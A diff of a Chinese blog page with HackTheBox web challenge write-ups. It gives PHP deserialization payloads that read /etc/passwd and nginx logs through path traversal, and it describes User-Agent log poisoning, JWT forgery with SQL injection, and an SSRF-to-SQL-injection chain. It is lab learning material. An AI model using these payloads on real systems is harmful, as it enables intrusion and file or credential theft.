class="string">&#x27;/&#x27;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;PHPSESSID&#x27;</span>]); <span class="comment">//base64 解码</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$cookie</span>); <span class="comment">// 反序列化，将字符串转换为对象</span></span><br></pre></td></tr></table></figure>
@@ -739,13 +739,13 @@
 <h4 id="题目部分"><a href="#题目部分" class="headerlink" title="题目部分"></a>题目部分</h4><h5 id="1-利用-cookie"><a href="#1-利用-cookie" class="headerlink" title="(1). 利用 cookie"></a>(1). 利用 cookie</h5><ul>
 <li>先抓包，获得 Cookie</li>
 </ul>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CookieGet.png" class>
 
 <p>尝试将 Cookie 的这一串进行解码，查看一下。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ListFileName.png" class>
 
 <p>这里的 &#x2F;www&#x2F;index.html，尝试是否能够进行其他文件的读取，这里尝试读取 &#x2F;etc&#x2F;passwd，并且进行目录遍历的混合攻击，查看回显。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/EtcPasswd.png" class>
 
 <ul>
 <li>base64 编码  <strong>(此处巨坑)</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL2V0Yy9wYXNzd2QiO30=</span><br></pre></td></tr></table></figure></li>
@@ -756,28 +756,28 @@
 <p>再发包，还是没有回显，真的坑，后来看了 WP 才知道，要把 s 的后面一个值改成 25。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">&quot;PageModel&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;../../../../etc/passwd&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">base64 的编码：</span><br><span class="line">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ==</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nginxAccessLog.png" class>
 
 <p>在这一次的发包当中我们是看到了 nginx 用户的</p>
 <h5 id="2-读取-nginx-用户的日志文件"><a href="#2-读取-nginx-用户的日志文件" class="headerlink" title="(2). 读取 nginx 用户的日志文件"></a>(2). 读取 nginx 用户的日志文件</h5><p>因为我们已经知道了 nginx 用户所在的位置，所以第二次的 payload 就无须再使用 <code>../</code> 来目录遍历了，直接访问 nginx 目录即可。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">&quot;PageModel&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;/var/log/nginx/access.log&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">base64 编码 ---&gt; Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AccessBase64Code.png" class>
 <h5 id="3-利用-User-Agent-进行命令执行"><a href="#3-利用-User-Agent-进行命令执行" class="headerlink" title="(3). 利用 User-Agent 进行命令执行"></a>(3). 利用 User-Agent 进行命令执行</h5><p>猜测 User-Agent 可以用来注入，即可以在 User-Agent 中进行命令执行，这里的 Cookie 还是使用上述的 access.log 的 payload，多发几次包(这里一定要多发几次，我真的踩坑踩死了)</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Toxicls.png" class>
 
 <p>这里有一个 “flag_B1lqM” 的文件，我们尝试进一步读取这一文件。此时已知 “flag_B1lqM” 的文件在 www 目录的文件夹下，所以获取 flag 文件，只需要让程序读取 flag，进行一遍序列化+反序列化的操作即可，所以构造 payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">&quot;PageModel&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;/flag_B1lqM&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">base64 编码---&gt;</span><br><span class="line">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL2ZsYWdfQjFscU0iO30=</span><br></pre></td></tr></table></figure>
 
 <p>GetFlag ~</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ToxicGetFlag.png" class>
 <h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><ul>
 <li>题目并不算难，是基于 php 反序列化漏洞，与目录遍历漏洞相结合的一道题目。主要是会踩很多的坑 ……</li>
 </ul>
 <hr>
 <h2 id="HackTheBox-Under-Construction"><a href="#HackTheBox-Under-Construction" class="headerlink" title="HackTheBox-Under-Construction"></a>HackTheBox-Under-Construction</h2><h3 id="0x01-前言-6"><a href="#0x01-前言-6" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>近期调整状态中……</p>
 <h3 id="0x02-初识靶场-5"><a href="#0x02-初识靶场-5" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><p>靶场界面如图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UnderConstruction.png" class>
 
 <p>看到这么一个登录注册的功界面，第一感还是 SQL 注入的。</p>
 <p>在登录界面尝试万能密码，SQL 注入失败，转向注册界面。点击 Register 之后跳转失败，还是停留在 &#x2F;auth 界面。没找到注册界面，这里可以利用 Burpsuite 寻找目录，但是节省时间，我们直接代码审计，最后发现居然没有注册界面 ……</p>
@@ -785,28 +785,28 @@
 <li>原来就是没有注册界面的，需要我们抓包后进行修改</li>
 </ul>
 <p>先将 GET 请求中的参数 <code>error</code> 删除掉，再将 Referer 的参数 <code>error</code> 也删除掉，最后添加 username 与 password。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Index.png" class>
 
 <p>我们以 admin，123 进行注册，毕竟是 CTF 嘛，不要用 admin，admin 比较好。</p>
 <p>注册进入之后的界面如图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LoginLike.png" class>
 
 <p>看着没什么搞头的样子，抓包看一看。发现了我们的老朋友，哟，这不是 JWT 吗 ~</p>
 <p>我们先前 Login 的时候，会在 Response 响应包处产生一个 JWT，而产生的 JWT 也会应用于登录进之后界面的 Cookie，把 JWT 解密一下。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JWTEncode.png" class>
 
 <ul>
 <li>All Right，基本的 Web 界面运行是差不多了，是时候开始我们的下一步 ———— 代码审计了。</li>
 </ul>
 <h3 id="0x03-代码审计-4"><a href="#0x03-代码审计-4" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><p>老样子，先看路由。我个人感觉是没什么东西阿，既没有 Flag，也没有命令执行类的明显漏洞，莫非要寄了？</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UnderConstructionRouteCode.png" class>
 
 <p>看着没啥东西，去到管理登录的 <strong>DBHelper.js</strong> 文件看一看，没想到居然是 SQL 语句 ~！</p>
 <p>在预编译盛行的时代中，第 11 行的内容太抓我的眼球了，一看就是 SQL 注入阿！</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SQLInjectionCode.png" class>
 
 <p>我们定位到 getUser 的方法，看一看谁调用了它。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SQLInjectionFind.png" class>
 
 <p>到这里就可以确定整个题目的思路了，首先 GET 请求 <code>/</code> 时，携带利用公钥伪造的 JWT，而 JWT 中的 <code>username</code> 字段值为 SQL 注入语句，执行后就可以进入数据库查找 <code>flag</code> 了。注入点在 Cookie 中的 JWT 中的 username 哈哈哈，有点绕。</p>
 <h3 id="0x04-Exploit-of-it"><a href="#0x04-Exploit-of-it" class="headerlink" title="0x04 Exploit of it"></a>0x04 Exploit of it</h3><p>这个漏洞的利用完全是脑洞题了……直接快速过了吧</p>
@@ -815,15 +815,15 @@
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ticarpi/jwt_tool</span><br><span class="line">pip3 install pycryptodomex</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JWT_Tools.png" class>
 
 <p>然后就是一套的 SQL 注入即可，不难。</p>
 <p>flag <code>HTB&#123;d0n7_3xp053_y0ur_publ1ck3y&#125;</code></p>
 <h2 id="HackTheBox-WeatherApp"><a href="#HackTheBox-WeatherApp" class="headerlink" title="HackTheBox-WeatherApp"></a>HackTheBox-WeatherApp</h2><h3 id="0x01-靶场简单分析-2"><a href="#0x01-靶场简单分析-2" class="headerlink" title="0x01 靶场简单分析"></a>0x01 靶场简单分析</h3><p>靶场界面如图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WeatherApp.png" class>
 
 <p>提示语是很长一段，翻译过来之后如图</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Translation.png" class>
 
 <ul>
 <li>中间有一段话引人注目</li>
@@ -831,23 +831,23 @@
 <li>这里有点感觉，这个网站应该是钓鱼的网站，通过天气预报钓鱼。</li>
 </ul>
 <p>再分析一下，它这里的 ublock 会把一部分给 block 掉。关闭 ublock，再刷新一下网站看看是否有奇效。<br>呃，怪怪的。打开 f12 之后，边上又出现了更怪的</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UnknownIndex.png" class>
 
 <h3 id="0x02-开打"><a href="#0x02-开打" class="headerlink" title="0x02 开打"></a>0x02 开打</h3><p>面对这么一个奇怪的网站，必然是先扫描目录了 ~ 扫出来了一个登录注册界面，运气还可以噢，上去康康。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Lists.png" class>
 
 <h4 id="登录界面尝试"><a href="#登录界面尝试" class="headerlink" title="登录界面尝试"></a>登录界面尝试</h4><p>在登录界面，一开始是使用 123 登录的，登录后回显为 “You are not admin”。嗯，感觉用户名是 admin，而且 admin 拥有较高的权限，是本题破解的核心所在。而不论输入任何 username 都会被保存，有点 shiro 的感觉。</p>
 <p>尝试用 admin 登录，回显如下图所示</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AdminBack.png" class>
 
 
 <ul>
 <li>爆破的闲暇时间尝试一下是否存在 SQL 注入，说实话在输入 admin 之后就感觉不存在 SQL 注入了，感觉更像 shiro 的工作方式。</li>
 <li>尝试 SQL 注入，失败，回到 register 界面康康。</li>
 </ul>
-<h4 id="注册界面尝试"><a href="#注册界面尝试" class="headerlink" title="注册界面尝试"></a>注册界面尝试</h4><p>一般来说如果登陆界面不存在 SQL 注入的话，可以多试试 register 注册界面。原因详见 —————— <a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/03/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-02-SQL%E6%B3%A8%E5%85%A5/#toc-heading-24" >注册界面的 SQL 注入<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="注册界面尝试"><a href="#注册界面尝试" class="headerlink" title="注册界面尝试"></a>注册界面尝试</h4><p>一般来说如果登陆界面不存在 SQL 注入的话，可以多试试 register 注册界面。原因详见 —————— <a class="link" target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/03/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-02-SQL%E6%B3%A8%E5%85%A5/#toc-heading-24">注册界面的 SQL 注入<i class="fas fa-external-link-alt"></i></a></p>
 <p>让我没想到的是，注册界面直接 401 了………………</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Error401Register.png" class>
 
 <p>而且报错之后会直接返回到 login 的界面 ………… 匪夷所思</p>
 <ul>
@@ -856,10 +856,10 @@
 <hr>
 <hr>
 <p>看到题目中的附件，下载下来看一看。然后就直接看到了 flag 哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈笑死，但肯定不能这么做。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WeatherAppflag.png" class>
 
 <p>这里移步至 “index.js” 的界面下，这里面是一堆判断的东西。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Judge.png" class>
 
 <ul>
 <li><p>第 19 行 – 第 34 行，很清楚得解释了为什么注册的时候会是返回 401 的状态码。</p>
@@ -870,7 +870,7 @@
 </li>
 </ul>
 <h2 id="0x03-代码审计-5"><a href="#0x03-代码审计-5" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><h3 id="1-审计获取-flag-的条件"><a href="#1-审计获取-flag-的条件" class="headerlink" title="1. 审计获取 flag 的条件"></a>1. 审计获取 flag 的条件</h3><p>先把获取 flag 的代码单独贴出来</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/FlagCondition.png" class>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">	let &#123; username, password &#125; = req.body;</span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line"> 		<span class="keyword">return</span> db.isAdmin(username, password)</span><br><span class="line">			.then(admin =&gt; &#123;</span><br><span class="line">				<span class="keyword">if</span> (admin) <span class="keyword">return</span> res.send(fs.readFileSync(<span class="string">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;You are not admin&#x27;</span>));</span><br><span class="line"> &#125;)</span><br><span class="line"> 			.catch(() =&gt; res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line"> &#125;</span><br><span class="line"> 	<span class="keyword">return</span> re.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <ul>
@@ -887,24 +887,24 @@
 <li>进一步分析，看一看 admin 到底在哪儿。</li>
 </ul>
 <h3 id="2-审计查找-admin"><a href="#2-审计查找-admin" class="headerlink" title="2. 审计查找 admin"></a>2. 审计查找 admin</h3><p>在文件夹中寻找到了 database.js 这个文件，感觉是突破口，代码审计一下。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AdminExist.png" class>
 
 <ul>
 <li>其中的数据库操作，第 24 行，里面的语句表明数据库里面已存在 admin 这一账户了<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;$&#123; crypto.randomBytes(32).toString(&#x27;</span>hex<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
 同时密码是随机生成的，我们想要通过正常的暴力破解是没有用的，剩下的就是通过注入的方式获取密码。</li>
 </ul>
 <p>来看到 Register 这里的判断，对输入的 username 和 password 并没有进行处理。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/InjectioNoDefense.png" class>
 
 <p>再康康判断 admin 的函数 “isadmin”</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/isAdmin.png" class>
 
 <p>我们想要成为 admin 用户，就必须知道 admin 用户的密码，而且注入点也是已知的了，在 Register 地方，其实之前的思路也算是正确了一部分，但是被 Register 的 401 给拦截掉了，应该早点想到 SSRF 的。</p>
 <h3 id="3-寻找可攻击的-SSRF-点"><a href="#3-寻找可攻击的-SSRF-点" class="headerlink" title="3. 寻找可攻击的 SSRF 点"></a>3. 寻找可攻击的 SSRF 点</h3><p>到 helpers 文件夹里面找，发现 “weatherData” 是可控的，此处存在 SSRF。</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> weatherData = <span class="keyword">await</span> <span class="title class_">HttpHelper</span>.<span class="title class_">HttpGet</span>(<span class="string">`http://<span class="subst">$&#123;endpoint&#125;</span>/data/2.5/weather?q=<span class="subst">$&#123;city&#125;</span>,<span class="subst">$&#123;country&#125;</span>&amp;units=metric&amp;appid=<span class="subst">$&#123;apiKey&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
 
 <p>再回去找这个函数 “HttpHelper” 的方法 HttpGet</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SSRFsee.png" class>
 
 <ul>
 <li>辗转多次，发现让我们在 &#x2F;api&#x2F;weather 里面构造 SSRF，通过 SSRF 访问 Register 接口，在 Register 接口处进行 SQL 注入。</li>
@@ -922,7 +922,7 @@
 
 
 <p>执行 exp 成功之后再返回到登录界面，使用 admin，admin 登录即可。</p>
-
+<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WeatherAppsucc.png" class>
 <h3 id="0x04-小结-1"><a href="#0x04-小结-1" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>这道题目难度中等，如果不提供源码的话是非常难以解决的，虽然可以想到 SSRF，但有点盲人摸象的感觉。</p>
 <p>加上 nodejs 的数据包传输问题，构造 exp 较为麻烦。建议初学者不一定要读懂 exp，只是简单了解做题的思路即可。</p>
 
